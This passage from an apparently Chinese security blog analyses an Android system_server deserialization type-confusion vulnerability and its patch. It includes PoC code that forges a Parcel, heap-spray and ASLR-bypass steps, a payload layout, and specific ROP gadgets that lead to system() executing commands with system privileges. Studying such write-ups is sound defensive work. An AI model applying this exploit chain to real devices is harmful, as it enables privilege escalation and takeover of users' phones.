class="number">1</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; data[i+<span class="number">2</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp; data[i+<span class="number">3</span>] == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">           data[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">           data[i+<span class="number">1</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   _data.recycle();</span><br><span class="line">   _data = Parcel.obtain();</span><br><span class="line">   _data.unmarshall(data, <span class="number">0</span>, data.length);</span><br><span class="line">   mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// Binder客户端的的mRemote其实是个BinderProxy类，使用transact方法描述符和参数传递给服务端进行远程调用</span></span><br><span class="line">   _reply.readException();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">   _reply.recycle();</span><br><span class="line">   _data.recycle();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>android.os.BinderProxy这个对象本身是不可序列化的，但是因为ObjectInputStream这个对象在反序列化时没有做校验，造成了类型混淆(type confusion)漏洞。BinderProxy的field被Native代码处理成指针，这个field就是我们在代码中设置的mOrgue。BinderProxy的finalize方法调用了Native代码，将mOruge处理成指针。</p><p>进程间传递Parcel类型数据，一端通过<code>writeToParcel</code>将对象映射成Parcel对象传递出去，另一端再通过<code>createFromParcel</code>将Parcel对象映射回原始对象进行处理。可以将Parcel看成是一个流，通过<code>writeToParcel</code>把对象写到流里面，在通过<code>createFromParcel</code>从流里读取对象。</p><p>然后看POC中修改过的不可反序列化的parcel对象<code>Android.os.BinderProxy</code>的处理过程，接POC最后执行流程，执行过<code>mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0)</code>过后，system_server层会去调用<code>IUserManager.onTransact()</code>方法，来到<code>case TRANSACTION_setApplicationRestrictions</code>分支开始处理传进来的parcel数据流：</p><p>先是<code>_arg1 = android.os.Bundle.CREATOR.createFromParcel(data)</code>读取数据对象，然后调用<code>this.setApplicationRestrictions(_arg0, _arg1, _arg2);</code></p><p>然后转入UserManagerService，UserManagerService继承<code>IUserManager.Stub</code>并实现了<code>setApplicationRestrictions</code>方法，下边的调用流程为(跟着参数_arg1也就是修改过不可反序列化的对象走)</p><blockquote><p>IUserManager.Stub.Proxy.setApplicationRestrictions(_arg0, _arg1, _arg2) -&gt;<br>UserManagerService.setApplicationRestrictions -&gt;<br>UserManagerService.writeApplicationRestrictionsLocked -&gt;<br>Bundle.keySet()(restrictions.keySet()) -&gt;<br>Bundle.unparcel() -&gt;<br>Parcel.readArrayMapInternal() -&gt;<br>Parcel.readValue(ClassLoader) -&gt;<br>Parcel.readSerializable(ClassLoader) -&gt;<br>ObjectInputStream.readObject() -&gt;<br>ObjectInputStream.readNonPrimitiveContent() -&gt;<br>ObjectInputStream.readNewObject() -&gt;补丁</p></blockquote><h2 id="Native分析："><a href="#Native分析：" class="headerlink" title="Native分析："></a>Native分析：</h2><p>假如BinderProxy可以被序列化，那么在反序列化时，其field引用的对象也会被反序列化；但在POC中ObjectInputStream反序列化的BinderProxy对象实例不可序列化，这样在ObjectInputStream反序列化BinderProxy对象时，发生了类型混淆（type confusion），其field被当做随后由Native代码处理的指针。这个field就是之前设置的0x1337beef，就是mOrgue这个变量。</p><p>反序列化的时候调用java.io.ObjectInputStream对象的readObject()方法，这个方法从输入流中读取出对象，也就是我们定义的BinderProxy对象。这个对象被创建后，因为代码中没有再引用它，所以它会进入到”可复活状态”，准备被GC回收，在回收前就会调用它的finalize()方法。</p><p>android.os.BinderProxy的finalize方法调用native代码，会将mOrgue处理为指针：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">destroy(); <span class="comment">// android_os_BinderProxy_destroy</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="built_in">super</span>.finalize();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中destroy函数的cpp代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">IBinder* b = (IBinder*)</span><br><span class="line">env-&gt;<span class="built_in">GetIntField</span>(obj, gBinderProxyOffsets.mObject);</span><br><span class="line"><span class="comment">// 上面提到我们传入的mOrgue的值，即是drl-&gt;decStrong方法所在类DeathRecipientList的this指针。</span></span><br><span class="line">DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">env-&gt;<span class="built_in">GetIntField</span>(obj, gBinderProxyOffsets.mOrgue); <span class="comment">// mOrgue被处理成了一个对象指针</span></span><br><span class="line"><span class="built_in">LOGDEATH</span>(<span class="string">&quot;Destroying BinderProxy %p: binder=%p drl=%p\n&quot;</span>, obj, b, drl);</span><br><span class="line">env-&gt;<span class="built_in">SetIntField</span>(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</span><br><span class="line">env-&gt;<span class="built_in">SetIntField</span>(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</span><br><span class="line">drl-&gt;<span class="built_in">decStrong</span>((<span class="type">void</span>*)javaObjectForIBinder);</span><br><span class="line"> <span class="comment">// drl就是mOrgue，可以被攻击者控制。drl-&gt;decStrong方法调用使用的this指针可由攻击者控制。</span></span><br><span class="line">b-&gt;<span class="built_in">decStrong</span>((<span class="type">void</span>*)javaObjectForIBinder);</span><br><span class="line">IPCThreadState::<span class="built_in">self</span>()-&gt;<span class="built_in">flushCommands</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中decStrong定义在DeathRecipientList的父类RefBase中</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RefBase::decStrong</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* id)</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">weakref_impl* <span class="type">const</span> refs = mRefs;</span><br><span class="line">refs-&gt;<span class="built_in">removeStrongRef</span>(id); <span class="comment">// 空实现</span></span><br><span class="line"><span class="type">const</span> <span class="type">int32_t</span> c = <span class="built_in">android_atomic_dec</span>(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PRINT_REFS</span></span><br><span class="line"><span class="built_in">ALOGD</span>(<span class="string">&quot;decStrong of %p from %p: cnt=%d\n&quot;</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="built_in">ALOG_ASSERT</span>(c &gt;= <span class="number">1</span>, <span class="string">&quot;decStrong() called on %p too many times&quot;</span>, refs);</span><br><span class="line"><span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">refs-&gt;mBase-&gt;<span class="built_in">onLastStrongRef</span>(id); <span class="comment">// 导致代码执行，并最终指向可执行的内存区域</span></span><br><span class="line"><span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">refs-&gt;<span class="built_in">decWeak</span>(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对Android::RefBase::decStrong进行逆向，IDA打开libutils.so：</p><p>mRefs是RefBase对象中第一个成员变量，RefBase是DeathRecipientList对象的父类，在C++中，对象的内存布局是先放置父类，然后放置自己的成员。而一个对象中方法是不占空间的，如果有虚函数会有一个虚函数表的地址(4字节)放置在对象的最开始，然后放置各个成员变量。这个类是有虚函数的，所以这里的mRefs变量的地址是DeathRecipientList对象也就是我们设置的mOrgue指针指向地址+4。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># drl(就是mOrgue，第一个可控的指针，在进入decStrong函数时的r0)必须指向可读的内存区域</span></span><br><span class="line">ldr r4, [r0, <span class="comment">#4]   # mRefs被加载到r4，r0是drl的this指针，mRefs是虚函数表之后的第一个私有变量，因此mRefs为r0+4所指向的内容</span></span><br><span class="line">mov r6, r1</span><br><span class="line">mov r0, r4         <span class="comment"># r4指向mRefs，r0指向mStrong</span></span><br><span class="line">blx &lt;android_atomic_dec ()&gt;    <span class="comment">#android_atomic_dec函数被调用，传入参数&amp;refs-&gt;mStrong</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入android_atomic_dec ()</span></span><br><span class="line"><span class="comment"># 为了调用refs-&gt;mBase-&gt;onLastStrongRef(id)，需要使refs-&gt;mStrong为1</span></span><br><span class="line">cmp r0, <span class="comment">#1          # r0 = refs-&gt;mStrong</span></span><br><span class="line">bne.n d1ea</span><br><span class="line">ldr r0, [r4, <span class="comment">#8]    # r4 = &amp;refs-&gt;mStrong</span></span><br><span class="line">mov r1, r6</span><br><span class="line">ldr r3, [r0, <span class="comment">#0] </span></span><br><span class="line">ldr r2, [r3, <span class="comment">#12]</span></span><br><span class="line">blx r2   <span class="comment"># 执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。</span></span><br></pre></td></tr></table></figure><p>mStrong是refs（类weakref_impl）的第一个成员变量，由于weakref_impl没有虚函数，所以没有虚函数表，因此mStrong就是r4所指向的内容。另外，refs-&gt;removeStrongRef(id);这一行并没有出现在汇编代码中，因为这个函数为空实现，编译器进行了优化。</p><h2 id="绕过ASLR："><a href="#绕过ASLR：" class="headerlink" title="绕过ASLR："></a>绕过ASLR：</h2><p>Android上有地址空间随机化(ASLR)，但是因为所有app都是fork自zygote进程，所以基础模块和dalvik-heap的内存布局全都是相同的。可以分析自己的内存布局获得system-server的内存布局，然后使用基础模块构建ROP链就可以绕过ASLR。</p><h2 id="Dalvik-heap-spary："><a href="#Dalvik-heap-spary：" class="headerlink" title="Dalvik-heap spary："></a>Dalvik-heap spary：</h2><p>为了能让blx r2这条执行能够可靠稳定的跳转到攻击者可控的代码，需要利用堆喷射技术，在system_server内存空间的dalvik-heap中预先布置大量的Spray Buffer, 其中放置提权代码以及大量指向该提权代码的地址。</p><p>向sysetem_server的dalvik-heap空间传入可控字符串，system_server向android系统提供绝大多数的系统服务，通过这些服务的一些特定方法可以向system_server传入String，同时system_server把这些String存储在Dalvik-heap中，在GC之前都不会销毁。</p><p>我们知道，同一进程的不同线程，是拥有各自的栈，但是互相共享text和data，所以堆也是可以共享的。所以，之前研究堆溢出时，可以看到malloc是有线程安全版本的，以保证不同线程分配堆时不会发生冲突。</p><p>于是，我们注册Receiver时，最终会调用<code>ActivityManagerService</code>中的方法<code>registerReceiver</code>，定义在文件<code>/frameworks/base/services/java/com/android/server/am/ActivityManagerService.java</code>中。其中会创建新的BroadcastFilter对象，这便是保存在堆上的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Intent <span class="title function_">registerReceiver</span><span class="params">(IApplicationThread caller, String callerPackage,</span></span><br><span class="line"><span class="params">            IIntentReceiver receiver, IntentFilter filter, String permission, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="type">BroadcastFilter</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BroadcastFilter</span>(filter, rl, callerPackage,</span><br><span class="line">                    permission, callingUid, userId);</span><br></pre></td></tr></table></figure><p>所以通过注册Receiver的方式，我们在Activity Manager、即system_server的堆上布置了payload。</p><h2 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h2><p>0x0 ：构造POC控制PC，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">+---------+-------------------+---------------&gt; payload start</span><br><span class="line">          |      SA+GBO       |</span><br><span class="line">          |                   |</span><br><span class="line">          +-------------------+</span><br><span class="line">          |     SA+GBO-4      |      SAO</span><br><span class="line">Relative  |                   |</span><br><span class="line">          +-------------------+</span><br><span class="line">addresses |     SA+GBO-8      |</span><br><span class="line">          |                   |</span><br><span class="line">chunk     +-----------------------------------&gt; SA</span><br><span class="line">          |       ....        |</span><br><span class="line">          +-------------------+    GBO-SAO</span><br><span class="line">          |        1          |</span><br><span class="line">+-----------------------------+---------------&gt; SA+GBO-SAO = GBA</span><br><span class="line">          |    0xdeadbeef     |</span><br><span class="line">          +-------------------+</span><br><span class="line">Gadget    |        SA         |</span><br><span class="line">          +-------------------+</span><br><span class="line">Buffer    |    0xdeadbeef     |</span><br><span class="line">          +-------------------+</span><br><span class="line">          |    ROP chain 0    |</span><br><span class="line">+---------+-------------------+</span><br></pre></td></tr></table></figure><p>整个payload分为两段：第一段Relative Addresses Chunk(RAC)是很长的一段，用于跳转到第二段；第二段Gadget Buffer(GB)则是用来放gadget的。上图中：</p><ul><li>SA指Static Address，即我们用来设置mOrgue的一个固定的地址</li><li>GBO指Gadget Buffer Offset，指的是GB在payload中的偏移量，也就是第一段的长度</li><li>SAO即Static Address Offset, 为SA相对于payload的偏移量。</li></ul><p>根据payload第一段的构造方式，此时SA处的内容为SA+GBO-SAO，正好为GB的实际地址Gadget Buffer Address(GBA)。所以，只要我们的第一段足够大，使得SA落在其中，则[SA]&#x3D;GBA。</p><p>按照decStrong的执行流程，实际执行效果如下。</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000</span>D<span class="number">15</span>A                 PUSH            &#123;R4-R6<span class="punctuation">,</span>LR&#125;</span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">15</span>C                 MOV             R<span class="number">5</span><span class="punctuation">,</span> R<span class="number">0</span> </span><br><span class="line"><span class="comment">; r0是this指针，即我们设定的mOrgue的值SA</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">15</span>E                 LDR             R<span class="number">4</span><span class="punctuation">,</span> [R0<span class="punctuation">,</span>#<span class="number">4</span>] </span><br><span class="line"><span class="comment">; r4 = [r0+4] = [SA+4] = SA+GBO-SAO-4 = GBA-4, 即r4是GB前4 BYTES处。</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">160</span>                 MOV             R<span class="number">6</span><span class="punctuation">,</span> R<span class="number">1</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">162</span>                 MOV             R<span class="number">0</span><span class="punctuation">,</span> R<span class="number">4</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">164</span>                 BLX             android_atomic_dec </span><br><span class="line"><span class="comment">; 对r4调用android_atomic_dec: 该方法接收一个指针作为参数，将所指内容减1，并将减1前的结果返回</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">168</span>                 CMP             R<span class="number">0</span><span class="punctuation">,</span> #<span class="number">1</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">16</span>A                 BNE             loc_D<span class="number">184</span> </span><br><span class="line"><span class="comment">; 如果android_atomic_dec(r4)==1，即[r4]==1, 则进入下一环节。根据payload的构造，[GBA-4]=1，符合要求</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">16</span>C                 LDR             R<span class="number">0</span><span class="punctuation">,</span> [R4<span class="punctuation">,</span>#<span class="number">8</span>] </span><br><span class="line"><span class="comment">; r0 = [r4+8] = [GBA-4+8] = [GBA+4]，根据payload的构造，[GBA+4]=SA，即r0 = SA</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">16</span>E                 MOV             R<span class="number">1</span><span class="punctuation">,</span> R<span class="number">6</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">170</span>                 LDR             R<span class="number">3</span><span class="punctuation">,</span> [R0]</span><br><span class="line"> <span class="comment">; r3 = [r0] = [SA] = GBA</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">172</span>                 LDR             R<span class="number">2</span><span class="punctuation">,</span> [R3<span class="punctuation">,</span>#<span class="number">0xC</span>] </span><br><span class="line"><span class="comment">; r2 = [r3+12] = [GBA+12]，即为ROP chain 0</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">174</span>                 BLX             R<span class="number">2</span> </span><br><span class="line"><span class="comment">; 执行ROP chain 0</span></span><br></pre></td></tr></table></figure><p>由此，我们实现了控制PC</p><p>0x1 然后就是搜索&#x2F;system&#x2F;lib&#x2F;下常用的库来构造ROPchain，</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ROP chain <span class="number">0</span></span><br><span class="line">libandroid_runtime.so thumb</span><br><span class="line"><span class="number">0x0007bcb2</span> : ldr r<span class="number">7</span><span class="punctuation">,</span> [r5] <span class="comment">; ldr r3, [r7, #0x14] ; blx r3</span></span><br><span class="line"></span><br><span class="line">ROP chain <span class="number">1</span></span><br><span class="line">libdvm.so thumb</span><br><span class="line"><span class="number">0x00041c12</span>: mov sp<span class="punctuation">,</span> r<span class="number">7</span><span class="comment">; pop [r4-r10, pc]</span></span><br><span class="line"></span><br><span class="line">ROP chain <span class="number">2</span></span><br><span class="line">libc.so arm</span><br><span class="line"><span class="number">0x0003c190</span> : ldr r<span class="number">0</span><span class="punctuation">,</span> [r0<span class="punctuation">,</span> #<span class="number">0x48</span>] <span class="comment">; pop &#123;r3, pc&#125;</span></span><br><span class="line"></span><br><span class="line">ROP chain <span class="number">3</span></span><br><span class="line">libc.so thumb</span><br><span class="line"><span class="number">799</span>: <span class="number">000246</span>a<span class="number">1</span>   <span class="number">200</span> FUNC    GLOBAL DEFAULT    <span class="number">8</span> system</span><br></pre></td></tr></table></figure><p>由于<code>decStrong</code>方法在开始执行时，首先会将<code>r0</code>的值保存到<code>r5</code>(见代码<code>0x0000D15C</code>处)，所以，通过chain 0 和chain 1，可以将<code>sp</code>的值设置到我们的Gadget Buffer中。随后，chain 2将<code>r0</code>设置为<code>[r0+0x48]</code>，即<code>r0=GBA-0x48</code>，我们把要执行的名称放在此处。最后，执行<code>system()</code>方法，其参数<code>r0</code>指向的，便是我们提供的要执行的命令。由此完成了整个ROP链，并以system的身份执行命令。</p><p>完整的payload结构示意图如下：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">`+----------------+-----------------+</span><br><span class="line">                 |                 |</span><br><span class="line">                 |                 |</span><br><span class="line">                 |       ...       |</span><br><span class="line">    Relative     |                 |</span><br><span class="line">                 |                 |</span><br><span class="line">    Addresses    +--------------------------------+</span><br><span class="line">                 |                 |</span><br><span class="line">    Chunk        |     command     |</span><br><span class="line">                 |                 |     <span class="number">0x48</span></span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |        <span class="number">1</span>        |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">                 |   <span class="number">0xdeadbeef</span>    |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |       SA        |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   <span class="number">0xdeadbeef</span>    |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   ROP chain <span class="number">0</span>   |</span><br><span class="line">                 +-----------------+</span><br><span class="line">     Gadget      |   <span class="number">0xdeadbeef</span>    |</span><br><span class="line">                 +-----------------+</span><br><span class="line">     Buffer      |   ROP chain <span class="number">1</span>   |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   <span class="number">0xdeadbeef</span>    |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   ROP chain <span class="number">2</span>   |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   <span class="number">0xdeadbeef</span>    |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   ROP chain <span class="number">3</span>   |</span><br><span class="line">+----------------+-----------------+`</span><br></pre></td></tr></table></figure><p>0x3 触发漏洞： 通过Receiver布置好堆，让system_server触发反序列化了。为此，我们将伪造的序列化字符串发送至system_server。system_server在将其反序列化后，得到伪造的<code>BinderProxy</code>。随后，在该对象被回收时，触发<code>finalize()</code>方法，进行访问我们设置的<code>mOrgue</code>，最后跳到设置好的的堆上，完成代码执行。</p><h2 id="补丁："><a href="#补丁：" class="headerlink" title="补丁："></a>补丁：</h2><p> <code>Class&lt;?&gt; objectClass = classDesc.checkAndGetTcObjectClass();</code></p><p>对比之前版本知道，最后<code>classDesc.checkAndGetTcObjectClass()</code>这里就是补丁代码了，进去<code>checkAndGetTcObjectClass()</code>看到上边几行注释</p><p>&#96;&#x2F;**</p><ul><li>Checks the local class to make sure it is valid for {@link ObjectStreamConstants#TC_OBJECT}</li><li>deserialization. Also performs some sanity checks of the stream data. This method is used</li><li>during deserialization to confirm the local class is likely to be compatible with the coming</li><li>stream data, but before an instance is instantiated.</li><li></li><li>@hide used internally during deserialization<br> *&#x2F;&#96;</li></ul><p>注释也很清楚了说明了，这是加的一个补丁，在数据被实例化之前，用来检测对象是否可被反序列化。更详细的补丁代码可以查看：<a href="https://github.com/CyanogenMod/android_libcore/commit/2d0fbea07c1a3c4368ddb07609d1a86993ed6de9">2d0fbea07c1a3c4368ddb07609d1a86993ed6de9</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAndGetTcObjectClass() <span class="keyword">throws</span> InvalidClassException &#123;</span><br><span class="line">+        <span class="comment">// We check some error possibilities that might cause problems later.</span></span><br><span class="line">+        <span class="type">boolean</span> <span class="variable">wasSerializable</span> <span class="operator">=</span> (flags &amp; ObjectStreamConstants.SC_SERIALIZABLE) != <span class="number">0</span>;</span><br><span class="line">+        <span class="type">boolean</span> <span class="variable">wasExternalizable</span> <span class="operator">=</span> (flags &amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != <span class="number">0</span>;</span><br><span class="line">+        <span class="keyword">if</span> (wasSerializable == wasExternalizable) &#123;</span><br><span class="line">+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">+                    getName() + <span class="string">&quot; stream data is corrupt: SC_SERIALIZABLE=&quot;</span> + wasSerializable</span><br><span class="line">+                            + <span class="string">&quot; SC_EXTERNALIZABLE=&quot;</span> + wasExternalizable</span><br><span class="line">+                            + <span class="string">&quot;, classDescFlags must have one or the other&quot;</span>);</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">+        <span class="comment">// TC_ENUM is handled elsewhere. See checkAndGetTcEnumClass().</span></span><br><span class="line">+        <span class="keyword">if</span> (isEnum()) &#123;</span><br><span class="line">+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">+                    getName() + <span class="string">&quot; local class is incompatible: Local class is an enum, streamed&quot;</span></span><br><span class="line">+                            + <span class="string">&quot; data is tagged with TC_OBJECT&quot;</span>);</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">+        <span class="comment">// isSerializable() is true if the local class implements Serializable. Externalizable</span></span><br><span class="line">+        <span class="comment">// classes are also Serializable via inheritance.</span></span><br><span class="line">+        <span class="keyword">if</span> (!isSerializable()) &#123;</span><br><span class="line">+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(getName() + <span class="string">&quot; local class is incompatible: Not&quot;</span></span><br><span class="line">+                    + <span class="string">&quot; Serializable&quot;</span>);</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">+        <span class="comment">// The stream class was externalizable, but is only serializable locally.</span></span><br><span class="line">+        <span class="keyword">if</span> (wasExternalizable != isExternalizable()) &#123;</span><br><span class="line">+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">+                    getName() + <span class="string">&quot; local class is incompatible: Local class is Serializable, stream&quot;</span></span><br><span class="line">+                            + <span class="string">&quot; data requires Externalizable&quot;</span>);</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">+        <span class="comment">// The following are left unchecked and thus are treated leniently at this point.</span></span><br><span class="line">+        <span class="comment">// SC_BLOCK_DATA may be set iff SC_EXTERNALIZABLE is set AND version 2 of the protocol is in</span></span><br><span class="line">+        <span class="comment">// use.</span></span><br><span class="line">+        <span class="comment">// SC_ENUM should not be set.</span></span><br><span class="line">+</span><br><span class="line">+        <span class="keyword">return</span> forClass();</span><br><span class="line">+    &#125;</span><br></pre></td></tr></table></figure><p><a href="https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2%5E%21/#F0">https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2^!&#x2F;#F0</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-2215:Android内核binder漏洞</title>
      <link href="/2023/06/29/CVE-2019-2215-Android%E5%86%85%E6%A0%B8binder%E6%BC%8F%E6%B4%9E/"/>
